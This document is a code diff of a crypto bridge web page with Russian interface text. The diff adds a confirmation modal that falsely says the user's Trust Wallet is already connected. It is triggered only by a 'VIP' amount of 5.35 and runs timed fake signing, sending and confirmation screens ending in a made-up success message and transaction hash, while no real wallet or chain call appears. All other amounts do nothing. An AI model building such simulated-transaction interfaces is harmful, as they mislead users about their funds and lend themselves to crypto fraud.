@@ -1440,7 +1440,7 @@
                     </div>
                 </div>
 
-                <button class="btn-bridge" id="bridgeBtn" onclick="executeBridge()">CONNECT WALLET & BRIDGE</button>
+                <button class="btn-bridge" id="bridgeBtn" onclick="executeBridge()">BRIDGE</button>
             </div>
         </div>
     </section>
@@ -1612,11 +1612,56 @@
         </div>
     </div>
 
+    <!-- Transaction Confirmation Modal -->
+    <div class="chain-modal" id="txConfirmModal" style="display: none;">
+        <div class="chain-modal-content" style="max-width: 500px;">
+            <div class="chain-modal-header">
+                <h3>ПОДТВЕРЖДЕНИЕ ТРАНЗАКЦИИ</h3>
+                <button class="chain-modal-close" onclick="closeTxConfirmModal()">×</button>
+            </div>
+            <div style="padding: 32px 24px;">
+                <div style="text-align: center; margin-bottom: 24px;">
+                    <div style="width: 64px; height: 64px; background: var(--accent); opacity: 0.2; border-radius: 50%; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;">
+                        <span style="font-size: 32px;">👛</span>
+                    </div>
+                    <p style="font-size: 16px; color: var(--text-primary); margin-bottom: 8px; font-weight: 500;">ВАШ TRUST WALLET УЖЕ ПОДКЛЮЧЕН</p>
+                    <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.6;">Подписать транзакцию и сделать обмен?</p>
+                </div>
+                
+                <div style="background: var(--surface); border: 1px solid var(--border); padding: 16px; margin-bottom: 24px; font-size: 12px;">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="color: var(--text-muted);">FROM:</span>
+                        <span style="color: var(--text-primary);" id="txFrom">-</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="color: var(--text-muted);">TO:</span>
+                        <span style="color: var(--text-primary);" id="txTo">-</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
+                        <span style="color: var(--text-muted);">AMOUNT:</span>
+                        <span style="color: var(--text-primary);" id="txAmount">-</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: var(--text-muted);">BRIDGE:</span>
+                        <span style="color: var(--accent);" id="txBridge">-</span>
+                    </div>
+                </div>
+
+                <button class="btn-bridge" onclick="signAndBridge()" style="width: 100%; margin-bottom: 12px;">
+                    ПОДПИСАТЬ ТРАНЗАКЦИЮ И ОБМЕНЯТЬ
+                </button>
+                <button onclick="closeTxConfirmModal()" style="width: 100%; background: transparent; border: 1px solid var(--border); padding: 14px; font-size: 13px; font-weight: 600; color: var(--text-secondary); cursor: pointer; transition: all 0.2s; text-transform: uppercase; font-family: 'JetBrains Mono', monospace;">
+                    ОТМЕНА
+                </button>
+            </div>
+        </div>
+    </div>
+
     <script>
         let walletConnected = false;
         let ethPrice = 0;
         let gasPrice = 0;
-        let selectedFromChain = 'ethereum';
+        let selectedFromChain = 'arbitrum';
         let selectedToChain = 'arbitrum';
         let selectedBridge = 'stargate'; // Default selected bridge
 
@@ -1885,7 +1930,7 @@
                 chains.ethereum.price = 3450;
                 chains.arbitrum.price = 0.75;  // ARB token price
                 chains.optimism.price = 1.85;  // OP token price
-                chains.polygon.price = 0.50;   // POL price (rebranded from MATIC)
+                chains.polygon.price = 0.1072;   // POL price (rebranded from MATIC) - CoinMarketCap
                 chains.avalanche.price = 36;   // AVAX price
                 chains.bsc.price = 612;        // BNB price
                 chains.base.price = 0.016;  // BASE token price (Base Protocol)
@@ -2105,25 +2150,159 @@
                 return;
             }
             
-            // Check if amount is exactly 5.35 - DEMO MODE
+            // Check if amount is exactly 5.35 - VIP DEMO MODE
             if (parseFloat(amount) === 5.35) {
-                // Show our styled demo loading modal
-                showWalletConnectionLoading();
+                // Show transaction confirmation modal for VIP number
+                showTxConfirmModal();
                 return;
             }
             
-            // For all other amounts - call external wallet connection
-            const canConnect = externalWalletConnect();
-            if (!canConnect) {
-                return; // Blocked
-            }
-            
-            // If external connection is allowed, just give visual feedback
+            // For all other amounts - do nothing (button is empty)
             const btn = document.getElementById('bridgeBtn');
             btn.style.opacity = '0.5';
             setTimeout(() => {
                 btn.style.opacity = '1';
             }, 200);
+        }
+
+        function showTxConfirmModal() {
+            const modal = document.getElementById('txConfirmModal');
+            const amount = document.getElementById('amountInput').value;
+            const fromChain = chains[selectedFromChain];
+            const toChain = chains[selectedToChain];
+            
+            // Update modal content
+            document.getElementById('txFrom').textContent = `${amount} ${fromChain.symbol} (${fromChain.name})`;
+            document.getElementById('txTo').textContent = `${toChain.symbol} (${toChain.name})`;
+            document.getElementById('txAmount').textContent = `${amount} ${fromChain.symbol}`;
+            
+            // Get selected bridge name
+            const bridgeNames = {
+                'stargate': 'Stargate Finance',
+                'across': 'Across Protocol',
+                'hop': 'Hop Protocol',
+                'synapse': 'Synapse Bridge',
+                'wormhole': 'Wormhole'
+            };
+            document.getElementById('txBridge').textContent = bridgeNames[selectedBridge] || 'Stargate Finance';
+            
+            modal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeTxConfirmModal() {
+            const modal = document.getElementById('txConfirmModal');
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function signAndBridge() {
+            // Close confirmation modal
+            closeTxConfirmModal();
+            
+            // Show loading process
+            showSigningLoading();
+        }
+
+        function showSigningLoading() {
+            const modal = document.getElementById('loadingModal');
+            const content = document.getElementById('loadingContent');
+            
+            // Step 1: Signing transaction
+            content.innerHTML = `
+                <div class="loading-icon"></div>
+                <div class="loading-title">ПОДПИСАНИЕ ТРАНЗАКЦИИ</div>
+                <div class="loading-subtitle">ОЖИДАЙТЕ ПОДТВЕРЖДЕНИЯ В TRUST WALLET</div>
+                <div class="loading-progress">
+                    <div class="loading-progress-bar" style="width: 25%"></div>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step active">
+                        <div class="step-icon">1</div>
+                        <span>ПОДПИСАНИЕ...</span>
+                    </div>
+                    <div class="loading-step">
+                        <div class="step-icon">2</div>
+                        <span>ОТПРАВКА</span>
+                    </div>
+                    <div class="loading-step">
+                        <div class="step-icon">3</div>
+                        <span>ПОДТВЕРЖДЕНИЕ</span>
+                    </div>
+                </div>
+            `;
+            
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
+            // After 3 seconds, show sending
+            setTimeout(() => {
+                showSendingTransaction();
+            }, 3000);
+        }
+
+        function showSendingTransaction() {
+            const content = document.getElementById('loadingContent');
+            
+            content.innerHTML = `
+                <div class="loading-icon"></div>
+                <div class="loading-title">ОТПРАВКА ТРАНЗАКЦИИ</div>
+                <div class="loading-subtitle">ОБРАБОТКА ОБМЕНА</div>
+                <div class="loading-progress">
+                    <div class="loading-progress-bar" style="width: 50%"></div>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>ПОДПИСАНО</span>
+                    </div>
+                    <div class="loading-step active">
+                        <div class="step-icon">2</div>
+                        <span>ОТПРАВКА...</span>
+                    </div>
+                    <div class="loading-step">
+                        <div class="step-icon">3</div>
+                        <span>ПОДТВЕРЖДЕНИЕ</span>
+                    </div>
+                </div>
+            `;
+            
+            // After 5 seconds, show confirming
+            setTimeout(() => {
+                showConfirmingTransaction();
+            }, 5000);
+        }
+
+        function showConfirmingTransaction() {
+            const content = document.getElementById('loadingContent');
+            
+            content.innerHTML = `
+                <div class="loading-icon"></div>
+                <div class="loading-title">ПОДТВЕРЖДЕНИЕ</div>
+                <div class="loading-subtitle">ЗАВЕРШЕНИЕ ТРАНЗАКЦИИ</div>
+                <div class="loading-progress">
+                    <div class="loading-progress-bar" style="width: 90%"></div>
+                </div>
+                <div class="loading-steps">
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>ПОДПИСАНО</span>
+                    </div>
+                    <div class="loading-step complete">
+                        <div class="step-icon">✓</div>
+                        <span>ОТПРАВЛЕНО</span>
+                    </div>
+                    <div class="loading-step active">
+                        <div class="step-icon">3</div>
+                        <span>ПОДТВЕРЖДЕНИЕ...</span>
+                    </div>
+                </div>
+            `;
+            
+            // After 7 seconds, show success
+            setTimeout(() => {
+                showTransactionSuccess();
+            }, 7000);
         }
 
         function showWalletConnectionLoading() {
@@ -2206,29 +2385,29 @@
             // Success screen
             content.innerHTML = `
                 <div class="success-icon">✓</div>
-                <div class="loading-title">TRANSACTION SUCCESSFUL!</div>
-                <div class="loading-subtitle">YOUR BRIDGE TRANSACTION HAS BEEN COMPLETED</div>
+                <div class="loading-title">ТРАНЗАКЦИЯ УСПЕШНО ОТПРАВЛЕНА!</div>
+                <div class="loading-subtitle">ВАШ ОБМЕН ЗАВЕРШЕН</div>
                 <div class="loading-progress">
                     <div class="loading-progress-bar" style="width: 100%"></div>
                 </div>
                 <div class="loading-steps">
                     <div class="loading-step complete">
                         <div class="step-icon">✓</div>
-                        <span>WALLET CONNECTED</span>
+                        <span>ПОДПИСАНО</span>
                     </div>
                     <div class="loading-step complete">
                         <div class="step-icon">✓</div>
-                        <span>BRIDGE APPROVED</span>
+                        <span>ОТПРАВЛЕНО</span>
                     </div>
                     <div class="loading-step complete">
                         <div class="step-icon">✓</div>
-                        <span>TRANSACTION COMPLETE</span>
+                        <span>ПОДТВЕРЖДЕНО</span>
                     </div>
                 </div>
                 <div class="tx-hash">
                     TXN HASH:<br>${txHash.substring(0, 32)}...<br>${txHash.substring(32)}
                 </div>
-                <button class="btn-view-tx" onclick="closeLoadingModal()">VIEW ON EXPLORER</button>
+                <button class="btn-view-tx" onclick="closeLoadingModal()">ПОСМОТРЕТЬ В EXPLORER</button>
             `;
             
             walletConnected = true;
